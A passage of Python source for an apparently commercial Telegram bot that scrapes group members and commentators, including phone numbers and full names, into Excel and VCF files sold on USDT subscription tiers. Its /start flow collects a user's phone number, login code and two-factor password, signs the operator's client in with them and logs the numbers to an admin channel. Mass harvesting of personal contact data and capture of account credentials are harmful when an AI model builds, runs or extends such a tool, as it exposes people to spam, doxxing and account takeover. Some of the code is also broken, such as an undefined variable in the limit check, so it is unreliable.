        'payment_pending': 'Awaiting funds transfer',
        'payment_update': 'Update Information',
        'payment_success': 'Payment successfully confirmed! Your subscription is activated until {end_time}.',
        'payment_error': 'Error checking payment: {error}',
        'entity_error': 'Could not retrieve user information. The user may be private or inaccessible.',
        'no_filter': 'Do not apply filter',
        'phone_contacts': 'Collect phone numbers and full names',
        'auth_access': 'Authorize for private chats',
        'caption_phones': 'Here is your file with phone numbers and full names (Excel and VCF).',
        'auth_request': 'To access private chats, add the bot as an admin or send a link to a private chat.',
        'auth_success': 'Access to the private chat successfully granted!',
        'auth_error': 'Could not gain access. Ensure the bot is added as an admin or the chat is public.',
        'note_cmd': 'Note successfully saved (bot will not respond).'
    },
    'Deutsch': {
        'welcome': 'Hallo! Wähle deine Sprache:',
        'enter_phone': 'Gib deine Telefonnummer im Format +380639678038 für die Autorisierung ein:',
        'enter_code': 'Gib den Bestätigungscode ein, den du per SMS oder Telegram erhalten hast:',
        'enter_password': 'Passwort für die Zwei-Faktor-Authentifizierung erforderlich. Gib dein Passwort ein:',
        'auth_success': 'Autorisierung erfolgreich abgeschlossen!',
        'auth_error': 'Autorisierungsfehler: {error}. Versuche es erneut mit /start.',
        'choose_language': 'Wähle eine Sprache:',
        'subscribe': 'Abonniere den Kanal: t.me/VideoStreamLog\nDrücke nach dem Abonnieren "Fortfahren".',
        'subscribed': 'Fortfahren',
        'you_chose': 'Du hast gewählt: {button}',
        'skip': 'Überspringen',
        'start_menu': 'Du: {name}\nDeine ID: {user_id}\nGewählte Sprache: {lang} /language\nAbonnementtyp: {sub_type}\nDein Abonnement endet in: {sub_time}\nGesamte Anfragen: {requests}\nVerbleibende Anfragen heute: {limit}',
        'identifiers': 'Sende mir @username, einen Beitrag-Link oder leite eine Nachricht weiter, um die ID herauszufinden.',
        'parser': 'Wähle, was du parsen möchtest:',
        'subscribe_button': 'Abonnement abschließen',
        'support': 'Support: {support}',
        'requisites': 'Zahlungsmöglichkeiten:\n1. [Methode 1]\n2. [Methode 2]\nKontaktiere {support} für die Zahlung.',
        'logs_channel': 'Log-Kanal: t.me/YourLogChannel',
        'link_group': 'Sende mir einen Link zu einer Gruppe oder einem Kanal, z.B.: https://t.me/group_name\nDu kannst mehrere Links mit Enter angeben.',
        'link_post': 'Sende mir einen Link zu einem Beitrag, z.B.: https://t.me/channel_name/12345\nOder leite einen Beitrag weiter. Du kannst mehrere Links mit Enter angeben.',
        'limit': 'Wie viele Benutzer sollen geparst werden? Wähle oder gib eine Zahl ein (max. 15.000 für bezahlte Abonnements, 150 für kostenlos).',
        'filter_username': 'Nur Benutzer mit Username filtern?',
        'filter_bots': 'Bots ausschließen?',
        'filter_active': 'Nur kürzlich aktive (innerhalb von 30 Tagen)?',
        'invalid_limit': 'Gib eine Zahl von 1 bis {max_limit} ein!',
        'invalid_number': 'Bitte gib eine Zahl ein!',
        'invalid_link': 'Bitte sende einen gültigen Beitrag-Link, z.B.: https://t.me/channel_name/12345\nOder mehrere Links mit Enter.',
        'fix_link': 'Wenn du einen Fehler gemacht hast, kann ich den Link korrigieren.',
        'suggest_link': 'Meintest du: {link}?',
        'retry_link': 'Sende den Link erneut:',
        'no_access': 'Fehler: Ich habe keinen Zugriff auf {link}. Stelle sicher, dass ich zum Chat hinzugefügt bin oder er öffentlich ist.',
        'flood_error': 'Fehler: {e}',
        'rpc_error': 'Fehler: {e}',
        'new_user': 'Neuer Benutzer: @{username} (ID: {user_id})',
        'language_cmd': 'Wähle eine neue Sprache:',
        'caption_commentators': 'Hier ist deine Datei mit Kommentatoren.',
        'caption_participants': 'Hier ist deine Datei mit Teilnehmern.',
        'caption_post_commentators': 'Hier ist deine Datei mit Beitragskommentatoren.',
        'limit_reached': 'Du hast das tägliche Limit ({limit} Anfragen) erreicht. Versuche es in {hours} Stunden erneut.',
        'id_result': 'ID: {id}',
        'close': 'Schließen',
        'continue_id': 'Fortfahren',
        'subscription_1h': '1 Stunde Abonnement - 2 USDT (TON)',
        'subscription_3d': '3 Tage Abonnement - 5 USDT (TON)',
        'subscription_7d': '7 Tage Abonnement - 7 USDT (TON)',
        'payment_wallet': 'Überweise {amount} USDT auf den TON-Wallet:\n{address}\nNach der Zahlung drücke "Ich habe bezahlt".',
        'payment_cancel': 'Abbrechen',
        'payment_paid': 'Ich habe bezahlt',
        'payment_hash': 'Sende den Transaktionshash:',
        'payment_pending': 'Warten auf Zahlungseingang',
        'payment_update': 'Informationen aktualisieren',
        'payment_success': 'Zahlung erfolgreich bestätigt! Dein Abonnement ist bis {end_time} aktiviert.',
        'payment_error': 'Fehler bei der Zahlungsprüfung: {error}',
        'entity_error': 'Konnte keine Benutzerinformationen abrufen. Der Benutzer könnte privat oder nicht zugänglich sein.',
        'no_filter': 'Keinen Filter anwenden',
        'phone_contacts': 'Telefonnummern und vollständige Namen sammeln',
        'auth_access': 'Autorisierung für private Chats',
        'caption_phones': 'Hier ist deine Datei mit Telefonnummern und vollständigen Namen (Excel und VCF).',
        'auth_request': 'Um auf private Chats zuzugreifen, füge den Bot als Administrator hinzu oder sende einen Link zu einem privaten Chat.',
        'auth_success': 'Zugang zum privaten Chat erfolgreich gewährt!',
        'auth_error': 'Konnte keinen Zugriff erhalten. Stelle sicher, dass der Bot als Administrator hinzugefügt wurde oder der Chat öffentlich ist.',
        'note_cmd': 'Notiz erfolgreich gespeichert (der Bot wird nicht reagieren).'
    }
}

# Логирование в канал
async def log_to_channel(context, message, username=None):
    try:
        log_message = f"{message}"
        if username:
            log_message = f"@{username}: {message}"
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message)
    except telegram_error.BadRequest as e:
        print(f"Ошибка при отправке лога в канал: {e}")

# Обновление пользовательских данных
def update_user_data(user_id, name, context, lang=None, subscription=None, requests=0):
    users = load_users()
    user_id_str = str(user_id)
    now = datetime.now()
    if user_id_str not in users:
        users[user_id_str] = {
            'name': name,
            'language': lang or 'Русский',
            'subscription': subscription or {'type': 'Бесплатная', 'end': None},
            'requests': 0,
            'daily_requests': {'count': 0, 'last_reset': now.isoformat()}
        }
    user = users[user_id_str]
    if 'daily_requests' not in user or not isinstance(user['daily_requests'], dict):
        user['daily_requests'] = {'count': 0, 'last_reset': now.isoformat()}
    if lang:
        user['language'] = lang
    if subscription:
        user['subscription'] = subscription
    last_reset = datetime.fromisoformat(user['daily_requests']['last_reset'])
    if (now - last_reset).days >= 1:
        user['daily_requests'] = {'count': 0, 'last_reset': now.isoformat()}
    user['requests'] = user.get('requests', 0) + requests
    user['daily_requests']['count'] += requests
    user['name'] = name
    save_users(users)
    return user

# Проверка лимита запросов
def check_request_limit(user_id):
    users = load_users()
    user_id_str = str(user_id)
    user = users.get(user_id_str, {})
    now = datetime.now()
    if 'daily_requests' not in user or not isinstance(user.get('daily_requests'), dict):
        user['daily_requests'] = {'count': 0, 'last_reset': now.isoformat()}
        save_users(users)
    daily_requests = user['daily_requests']
    last_reset = datetime.fromisoformat(daily_requests['last_reset'])
    if (now - last_reset).days >= 1:
        daily_requests = {'count': 0, 'last_reset': now.isoformat()}
        users[user_id_str]['daily_requests'] = daily_requests
        save_users(users)
    subscription = user.get('subscription', {'type': 'Бесплатная', 'end': None})
    max_requests = 5 if subscription['type'] == 'Бесплатная' else float('inf')
    return daily_requests['count'] < max_requests, 24 - (now - last_reset).seconds // 3600

# Проверка лимита парсинга
def check_parse_limit(user_id, limit):
    users = load_users()
    user_id_str = str(user_id)
    user = users.get(user_id_str, {})
    subscription = user.get('subscription', {'type': 'Бесплатная', 'end': None})
    now = datetime.now()
    if subscription['type'].startswith('Платная') and subscription['end']:
        if datetime.fromisoformat(subscription['end']) < now:
            update_user_data(user_id, user.get('name', 'Неизвестно'), None, subscription={'type': 'Бесплатная', 'end': None})
            lang = user.get('language', 'Русский')
            texts = LANGUAGES[lang]
            loop = asyncio.get_event_loop()
            loop.run_until_complete(
                context.bot.send_message(chat_id=user_id, text="⚠️ Ваша платная подписка истекла. Теперь у вас бесплатная подписка с лимитом 150 пользователей на парсинг." if lang == 'Русский' else 
                                        "⚠️ Ваша платна підписка закінчилася. Тепер у вас безкоштовна підписка з лімітом 150 користувачів на парсинг." if lang == 'Украинский' else 
                                        "⚠️ Your paid subscription has expired. You now have a free subscription with a limit of 150 users for parsing." if lang == 'English' else 
                                        "⚠️ Dein bezahltes Abonnement ist abgelaufen. Du hast jetzt ein kostenloses Abonnement mit einem Limit von 150 Benutzern zum Parsen.")
            )
            subscription = {'type': 'Бесплатная', 'end': None}
    if subscription['type'] == 'Бесплатная':
        return min(limit, 150)
    elif subscription['type'] == 'Платная (бессрочная)':
        return min(limit, 15000)
    else:
        return min(limit, 15000)

# Создание файла Excel
async def create_excel_in_memory(data):
    df = pd.DataFrame(data, columns=['ID', 'Username', 'First Name', 'Last Name', 'Bot', 'Nickname'])
    df['Nickname'] = '@' + df['Nickname'].astype(str)
    excel_file = io.BytesIO()
    with pd.ExcelWriter(excel_file, engine='xlsxwriter') as writer:
        df.to_excel(writer, index=False, sheet_name='Sheet1')
        workbook = writer.book
        worksheet = writer.sheets['Sheet1']
        for idx, col in enumerate(df.columns):
            series = df[col]
            max_length = max((series.astype(str).map(len).max(), len(str(series.name)))) + 2
            worksheet.set_column(idx, idx, max_length)
    excel_file.seek(0)
    return excel_file

# Создание VCF файла для контактов
def create_vcf_file(data):
    vcf_content = io.BytesIO()
    for _, row in data.iterrows():
        if row['Phone'] and row['First Name']:
            vcard = vobject.vCard()
            vcard.add('fn').value = f"{row['First Name']} {row['Last Name']}".strip()
            vcard.add('tel').value = row['Phone']
            vcard.add('url').value = f"https://t.me/{row['Username']}" if row['Username'] else ""
            vcf_content.write(str(vcard).encode('utf-8'))
            vcf_content.write(b'\n')
    vcf_content.seek(0)
    return vcf_content

# Фильтрация данных
def filter_data(data, filters):
    filtered_data = data
    if filters.get('only_with_username'):
        filtered_data = [row for row in filtered_data if row[1]]
    if filters.get('exclude_bots'):
        filtered_data = [row for row in filtered_data if not row[4]]
    if filters.get('only_active'):
        filtered_data = [row for row in filtered_data if is_active_recently(row[5])]
    return filtered_data

def is_active_recently(user):
    if not user or not hasattr(user, 'status') or not user.status:
        return True
    if hasattr(user.status, 'was_online'):
        return (datetime.now() - user.status.was_online).days < 30
    return True

# Подсчёт статистики
def get_statistics(data):
    total = len(data)
    with_username = sum(1 for row in data if row[1])
    bots = sum(1 for row in data if row[4])
    without_name = sum(1 for row in data if not row[2] and not row[3])
    return f"Всего: {total}\nС username: {with_username}\nБотов: {bots}\nБез имени: {without_name}"

# Получение главного меню
def get_main_menu(user_id, context):
    users = load_users()
    user_id_str = str(user_id)
    user_data = users.get(user_id_str, {})
    lang = user_data.get('language', 'Русский')
    texts = LANGUAGES[lang]
    sub_type = user_data.get('subscription', {}).get('type', 'Бесплатная')
    sub_end = user_data.get('subscription', {}).get('end')
    sub_time = '—' if sub_type == 'Бесплатная' else (
        'бессрочно' if sub_end is None else 
        f"{(datetime.fromisoformat(sub_end) - datetime.now()).days * 24 + (datetime.fromisoformat(sub_end) - datetime.now()).seconds // 3600} часов"
    )
    requests = user_data.get('requests', 0)
    name = user_data.get('name', 'Неизвестно')
    limit_left, hours_left = check_request_limit(user_id)
    limit_display = 5 if sub_type == 'Бесплатная' else 10 - user_data.get('daily_requests', {}).get('count', 0)
    
    is_admin = user_id_str in ADMIN_IDS
    
    buttons = [
        [InlineKeyboardButton("Идентификаторы" if lang == 'Русский' else "Ідентифікатори" if lang == 'Украинский' else "Identifiers" if lang == 'English' else "Identifikatoren", callback_data='identifiers'), 
         InlineKeyboardButton("(!)", callback_data='info_identifiers')],
        [InlineKeyboardButton("Сбор данных / Парсер" if lang == 'Русский' else "Збір даних / Парсер" if lang == 'Украинский' else "Data collection / Parser" if lang == 'English' else "Datensammlung / Parser", callback_data='parser'), 
         InlineKeyboardButton("(!)", callback_data='info_parser')],
        [InlineKeyboardButton(texts['subscribe_button'], callback_data='subscribe'), InlineKeyboardButton("(!)", callback_data='info_subscribe')],
        [InlineKeyboardButton(f"{texts['support'].format(support=SUPPORT_USERNAME)}", url=f"https://t.me/{SUPPORT_USERNAME[1:]}")],
        [InlineKeyboardButton("Реквизиты" if lang == 'Русский' else "Реквізити" if lang == 'Украинский' else "Requisites" if lang == 'English' else "Zahlungsdaten", callback_data='requisites'), 
         InlineKeyboardButton("(!)", callback_data='info_requisites')]
    ]
    if is_admin:
        buttons.append([InlineKeyboardButton("Канал с логами" if lang == 'Русский' else "Канал з логами" if lang == 'Украинский' else "Logs channel" if lang == 'English' else "Log-Kanal", callback_data='logs_channel'), 
                        InlineKeyboardButton("(!)", callback_data='info_logs')])
    
    return texts['start_menu'].format(
        name=name, user_id=user_id, lang=lang, sub_type=sub_type, sub_time=sub_time, requests=requests, limit=limit_display
    ), InlineKeyboardMarkup(buttons)

# Обработчик команды /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Без username"
    name = update.effective_user.full_name
    users = load_users()

    try:
        await client_telethon.connect()
        if not client_telethon.is_connected():
            await update.message.reply_text(LANGUAGES['Русский']['enter_phone'])
            context.user_data['waiting_for_phone'] = True
            await log_to_channel(context, f"Запрос номера телефона у @{username}", username)
            return

        if str(user_id) not in users:
            await log_to_channel(context, LANGUAGES['Русский']['new_user'].format(username=username, user_id=user_id), username)
            keyboard = [
                [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
                [InlineKeyboardButton("English", callback_data='lang_English')],
                [InlineKeyboardButton("Deutsch", callback_data='lang_Deutsch')]
            ]
            await update.message.reply_text(LANGUAGES['Русский']['welcome'], reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            lang = users[str(user_id)]['language']
            await update.message.reply_text(LANGUAGES[lang]['subscribe'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(LANGUAGES[lang]['subscribed'], callback_data='subscribed')]]))
            update_user_data(user_id, name, context)

    except telethon_errors.RPCError as e:
        await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
        await log_to_channel(context, f"Ошибка подключения/авторизации для @{username}: {str(e)}", username)
    except Exception as e:
        print(f"Ошибка в /start: {str(e)}\n{traceback.format_exc()}")
    finally:
        if client_telethon.is_connected():
            await client_telethon.disconnect()

# Обработчик команды /language
async def language(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Без username"
    users = load_users()
    lang = users.get(str(user_id), {}).get('language', 'Русский')
    keyboard = [
        [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
        [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
        [InlineKeyboardButton("English", callback_data='lang_English')],
        [InlineKeyboardButton("Deutsch", callback_data='lang_Deutsch')]
    ]
    await update.message.reply_text(LANGUAGES[lang]['language_cmd'], reply_markup=InlineKeyboardMarkup(keyboard))

# Обработчик команды /set_plan
async def set_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) not in ADMIN_IDS:
        await update.message.reply_text("У вас нет прав для этой команды.")
        return
    
    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Использование: /set_plan <user_id> <type> <duration>")
        return
    
    target_user_id, sub_type, duration = args[0], args[1], int(args[2])
    now = datetime.now()
    
    if sub_type == '1h':
        end_time = now + timedelta(hours=duration)
    elif sub_type == '3d':
        end_time = now + timedelta(days=duration)
    elif sub_type == '7d':
        end_time = now + timedelta(days=duration)
    elif sub_type == 'permanent':
        end_time = None
    else:
        await update.message.reply_text("Неверный тип подписки. Используйте '1h', '3d', '7d' или 'permanent' для админов.")
        return
    
    subscription_type = f'Платная ({sub_type})' if sub_type in ['1h', '3d', '7d'] else 'Платная (бессрочная)'
    update_user_data(target_user_id, "Имя пользователя", context, subscription={'type': subscription_type, 'end': end_time.isoformat() if end_time else None})
    
    username = load_users().get(str(target_user_id), {}).get('name', 'Неизвестно')
    lang = load_users().get(str(target_user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    
    notification = texts['payment_success'].format(end_time=end_time.strftime('%Y-%m-%d %H:%M:%S') if end_time else 'бессрочно')
    await context.bot.send_message(chat_id=target_user_id, text=f"🎉 {notification}")
    
    await update.message.reply_text(f"Подписка для пользователя {target_user_id} ({username}) обновлена до {end_time.strftime('%Y-%m-%d %H:%M:%S') if end_time else 'бессрочно'}.")
    await log_to_channel(context, f"Администратор установил подписку для пользователя {target_user_id} ({username}): {sub_type}, до {end_time if end_time else 'бессрочно'}", "Администратор")

# Обработчик команды /remove_plan
async def remove_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) not in ADMIN_IDS:
        await update.message.reply_text("У вас нет прав для этой команды.")
        return
    
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("Использование: /remove_plan <user_id>")
        return
    
    target_user_id = args[0]
    if str(target_user_id) not in load_users():
        await update.message.reply_text("Пользователь не найден.")
        return
    
    update_user_data(target_user_id, "Имя пользователя", context, subscription={'type': 'Бесплатная', 'end': None})
    username = load_users().get(str(target_user_id), {}).get('name', 'Неизвестно')
    await update.message.reply_text(f"Платная подписка для пользователя {target_user_id} ({username}) удалена, установлен бесплатный план.")
    await log_to_channel(context, f"Администратор удалил платную подписку для пользователя {target_user_id} ({username})", "Администратор")

# Обработчик команды /note
async def note(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Без username"
    if not context.args:
        await update.message.reply_text("Использование: /note <текст>")
        return
    note_text = " ".join(context.args)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    await log_to_channel(context, f"Заметка от @{username}: {note_text}", username)
    await update.message.reply_text(LANGUAGES[lang]['note_cmd'])

# Обработчик текстовых сообщений
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    context.user_data['user_id'] = user_id
    username = update.effective_user.username or "Без username"
    users = load_users()
    text = update.message.text.strip() if update.message.text else ""

    try:
        await client_telethon.connect()
    except telethon_errors.RPCError as e:
        await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
        await log_to_channel(context, f"Ошибка подключения для @{username}: {str(e)}", username)
        print(f"Ошибка подключения Telethon: {str(e)}\n{traceback.format_exc()}")
        return
    except Exception as e:
        print(f"Неизвестная ошибка подключения Telethon: {str(e)}\n{traceback.format_exc()}")
        return

    if context.user_data.get('waiting_for_phone'):
        if not text.startswith('+'):
            await update.message.reply_text("Пожалуйста, введите номер в формате +380639678038:")
            await client_telethon.disconnect()
            return
        context.user_data['phone'] = text
        try:
            await client_telethon.send_code_request(text)
            await update.message.reply_text(LANGUAGES['Русский']['enter_code'])
            context.user_data['waiting_for_code'] = True
            del context.user_data['waiting_for_phone']
            await log_to_channel(context, f"Номер телефона @{username}: {text}", username)
        except telethon_errors.RPCError as e:
            await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
            await log_to_channel(context, f"Ошибка ввода номера @{username}: {str(e)}", username)
            print(f"Ошибка при запросе кода: {str(e)}\n{traceback.format_exc()}")
        finally:
            await client_telethon.disconnect()
        return

    if context.user_data.get('waiting_for_code'):
        try:
            await client_telethon.sign_in(context.user_data['phone'], text)
            await update.message.reply_text(LANGUAGES['Русский']['auth_success'])
            del context.user_data['waiting_for_code']
            await log_to_channel(context, f"Успешная авторизация @{username}", username)
            keyboard = [
                [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
                [InlineKeyboardButton("English", callback_data='lang_English')],
                [InlineKeyboardButton("Deutsch", callback_data='lang_Deutsch')]
            ]
            await update.message.reply_text(LANGUAGES['Русский']['welcome'], reply_markup=InlineKeyboardMarkup(keyboard))
        except telethon_errors.SessionPasswordNeededError:
            await update.message.reply_text(LANGUAGES['Русский']['enter_password'])
            context.user_data['waiting_for_password'] = True
            del context.user_data['waiting_for_code']
            await log_to_channel(context, f"Запрос пароля 2FA у @{username}", username)
        except telethon_errors.RPCError as e:
            await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
            await log_to_channel(context, f"Ошибка ввода кода @{username}: {str(e)}", username)
            print(f"Ошибка при вводе кода: {str(e)}\n{traceback.format_exc()}")
        finally:
            await client_telethon.disconnect()
        return

    if context.user_data.get('waiting_for_password'):
        try:
            await client_telethon.sign_in(password=text)
            await update.message.reply_text(LANGUAGES['Русский']['auth_success'])
            del context.user_data['waiting_for_password']
            await log_to_channel(context, f"Успешная авторизация с 2FA @{username}", username)
            keyboard = [
                [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
                [InlineKeyboardButton("English", callback_data='lang_English')],
                [InlineKeyboardButton("Deutsch", callback_data='lang_Deutsch')]
            ]
            await update.message.reply_text(LANGUAGES['Русский']['welcome'], reply_markup=InlineKeyboardMarkup(keyboard))
        except telethon_errors.RPCError as e:
            await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
            await log_to_channel(context, f"Ошибка ввода пароля 2FA @{username}: {str(e)}", username)
            print(f"Ошибка при вводе пароля 2FA: {str(e)}\n{traceback.format_exc()}")
        finally:
            await client_telethon.disconnect()
        return

    if str(user_id) not in users or 'language' not in users[str(user_id)]:
        await client_telethon.disconnect()
        return
    
    lang = users[str(user_id)]['language']
    texts = LANGUAGES[lang]
    
    if context.user_data.get('parsing_in_progress', False):
        await client_telethon.disconnect()
        return
    
    limit_ok, hours_left = check_request_limit(user_id)
    if not limit_ok:
        await update.message.reply_text(texts['limit_reached'].format(limit=5 if users[str(user_id)]['subscription']['type'] == 'Бесплатная' else 10, hours=hours_left))
        await client_telethon.disconnect()
        return
    
    if text.startswith('/note '):
        await note(update, context)
        await client_telethon.disconnect()
        return
    
    if 'waiting_for_hash' in context.user_data:
        context.user_data['transaction_hash'] = text
        del context.user_data['waiting_for_hash']
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=f"Пользователь @{username} (ID: {user_id}) отправил хэш транзакции:\n{text}"
                )
            except telegram_error.BadRequest as e:
                print(f"Ошибка отправки хэша администратору {admin_id}: {e}")
        await log_to_channel(context, f"Хэш транзакции от @{username}: {text}", username)
        await check_payment_status(update.message, context)
        await client_telethon.disconnect()
        return

    if 'waiting_for_id' in context.user_data:
        if text.startswith('@'):
            try:
                entity = await client_telethon.get_entity(text[1:])
                msg = await update.message.reply_text(texts['id_result'].format(id=entity.id), reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(texts['close'], callback_data='close_id'), InlineKeyboardButton(texts['continue_id'], callback_data='continue_id')]
                ]))
                await context.bot.set_message_reaction(chat_id=update.message.chat_id, message_id=msg.message_id, reaction=["🎉"])
            except telethon_errors.RPCError as e:
                await update.message.reply_text(texts['rpc_error'].format(e=str(e)))
                await log_to_channel(context, texts['rpc_error'].format(e=str(e)), username)
        elif update.message.forward_origin and hasattr(update.message.forward_origin, 'chat'):
            chat_id = update.message.forward_origin.chat.id
            msg = await update.message.reply_text(texts['id_result'].format(id=chat_id), reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(texts['close'], callback_data='close_id'), InlineKeyboardButton(texts['continue_id'], callback_data='continue_id')]
            ]))
            await context.bot.set_message_reaction(chat_id=update.message.chat_id, message_id=msg.message_id, reaction=["🎉"])
            await log_to_channel(context, f"Получен ID чата: {chat_id}", username)
        elif update.message.forward_origin and hasattr(update.message.forward_origin, 'sender_user'):
            user_id_forward = update.message.forward_origin.sender_user.id
            msg = await update.message.reply_text(texts['id_result'].format(id=user_id_forward), reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(texts['close'], callback_data='close_id'), InlineKeyboardButton(texts['continue_id'], callback_data='continue_id')]
            ]))
            await context.bot.set_message_reaction(chat_id=update.message.chat_id, message_id=msg.message_id, reaction=["🎉"])
            await log_to_channel(context, f"Получен ID пользователя: {user_id_forward}", username)
        elif text.startswith('https://t.me/'):
            try:
                parts = text.split('/')
                if len(parts) > 4:
                    chat_id = f"@{parts[-2]}" if not parts[-2].startswith('+') else parts[-2]
                    entity = await client_telethon.get_entity(chat_id)
                    msg = await update.message.reply_text(texts['id_result'].format(id=entity.id), reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(texts['close'], callback_data='close_id'), InlineKeyboardButton(texts['continue_id'], callback_data='continue_id')]
                    ]))
                    await context.bot.set_message_reaction(chat_id=update.message.chat_id, message_id=msg.message_id, reaction=["🎉"])
                    await log_to_channel(context, f"Получен ID через ссылку: {entity.id}", username)
                else:
                    await update.message.reply_text("Отправь корректную ссылку!")
            except telethon_errors.RPCError as e:
                await update.message.reply_text(texts['rpc_error'].format(e=str(e)))
                await log_to_channel(context, texts['rpc_error'].format(e=str(e)), username)
        del context.user_data['waiting_for_id']
        await client_telethon.disconnect()
        return
    
    if 'waiting_for_limit' in context.user_data:
        try:
            limit = int(text)
            max_limit = 15000 if users[str(user_id)]['subscription']['type'].startswith('Платная') else 150
            if limit <= 0 or limit > max_limit:
                await update.message.reply_text(texts['invalid_limit'].format(max_limit=max_limit), reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['skip'], callback_data='skip_limit')]]))
                await client_telethon.disconnect()
                return
            context.user_data['limit'] = limit
            del context.user_data['waiting_for_limit']
            await ask_for_filters(update.message, context)
        except ValueError:
            await update.message.reply_text(texts['invalid_number'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['skip'], callback_data='skip_limit')]]))
            await client_telethon.disconnect()
        return

    if 'waiting_for_filters' in context.user_data:
        filters = context.user_data.get('filters', {'only_with_username': False, 'exclude_bots': False, 'only_active': False})
        if 'да' in text.lower() or 'yes' in text.lower() or 'ja' in text.lower():
            filters[context.user_data['current_filter']] = True
        del context.user_data['waiting_for_filters']
        del context.user_data['current_filter']
        context.user_data['filters'] = filters
        await process_parsing(update.message, context)
        await client_telethon.disconnect()
        return
    
    if 'parse_type' in context.user_data:
        if text:
            links = text.split('\n') if '\n' in text else [text]
            if context.user_data['parse_type'] == 'parse_post_commentators':
                valid_links = [link for link in links if link.startswith('https://t.me/') and '/' in link[13:]]
                if not valid_links:
                    await update.message.reply_text(texts['invalid_link'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['fix_link'], callback_data='fix_link')]]))
                    context.user_data['last_input'] = text
                    await client_telethon.disconnect()
                    return
                context.user_data['links'] = valid_links
            else:
                context.user_data['links'] = links
            await ask_for_limit(update.message, context)
        elif update.message.forward_origin and hasattr(update.message.forward_origin, 'chat') and context.user_data['parse_type'] == 'parse_post_commentators':
            context.user_data['links'] = [f"https://t.me/{update.message.forward_origin.chat.username}/{update.message.forward_origin.message_id}"]
            context.user_data['chat_id'] = update.message.forward_origin.chat.id
            context.user_data['post'] = update.message.forward_origin.message_id
            await ask_for_limit(update.message, context)
        await client_telethon.disconnect()

# Запрос лимита парсинга
async def ask_for_limit(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    subscription = load_users().get(str(user_id), {}).get('subscription', {'type': 'Бесплатная', 'end': None})
    is_paid = subscription['type'].startswith('Платная')
    max_limit = 15000 if is_paid else 150
    keyboard = [
        [InlineKeyboardButton("100", callback_data='limit_100'), InlineKeyboardButton("500", callback_data='limit_500')],
        [InlineKeyboardButton("1000", callback_data='limit_1000'), InlineKeyboardButton(texts['skip'], callback_data='skip_limit')],
        [InlineKeyboardButton("Другое" if lang == 'Русский' else "Інше" if lang == 'Украинский' else "Other" if lang == 'English' else "Andere", callback_data='limit_custom')]
    ]
    if is_paid:
        keyboard.append([InlineKeyboardButton(texts['no_filter'], callback_data='no_filter')])
    await message.reply_text(texts['limit'], reply_markup=InlineKeyboardMarkup(keyboard))

# Запрос фильтров
async def ask_for_filters(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    keyboard = [
        [InlineKeyboardButton("Да" if lang == 'Русский' else "Так" if lang == 'Украинский' else "Yes" if lang == 'English' else "Ja", callback_data='filter_yes'),
         InlineKeyboardButton("Нет" if lang == 'Русский' else "Ні" if lang == 'Украинский' else "No" if lang == 'English' else "Nein", callback_data='filter_no')],
        [InlineKeyboardButton(texts['skip'], callback_data='skip_filters')]
    ]
    context.user_data['waiting_for_filters'] = True
    context.user_data['current_filter'] = 'only_with_username'
    context.user_data['filters'] = {'only_with_username': False, 'exclude_bots': False, 'only_active': False}
    await message.reply_text(texts['filter_username'], reply_markup=InlineKeyboardMarkup(keyboard))

# Функции парсинга
async def parse_commentators(group_link, limit):
    entity = await client_telethon.get_entity(group_link)
    commentators = set()
    messages = await client_telethon.get_messages(entity, limit=limit)
    for message in messages:
        if hasattr(message, 'sender_id') and message.sender_id:
            commentators.add(message.sender_id)
    
    data = []
    for commentator_id in commentators:
        try:
            participant = await client_telethon.get_entity(commentator_id)
            if isinstance(participant, tl.types.User):
                data.append([
                    participant.id,
                    participant.username if participant.username else "",
                    participant.first_name if participant.first_name else "",
                    participant.last_name if participant.last_name else "",
                    participant.bot,
                    participant
                ])
        except (telethon_errors.RPCError, ValueError) as e:
            print(f"Ошибка получения сущности для ID {commentator_id}: {str(e)}")
            continue
    return data

async def parse_participants(group_link, limit):
    entity = await client_telethon.get_entity(group_link)
    participants = await client_telethon.get_participants(entity, limit=limit)
    data = []
    for participant in participants:
        if isinstance(participant, tl.types.User):
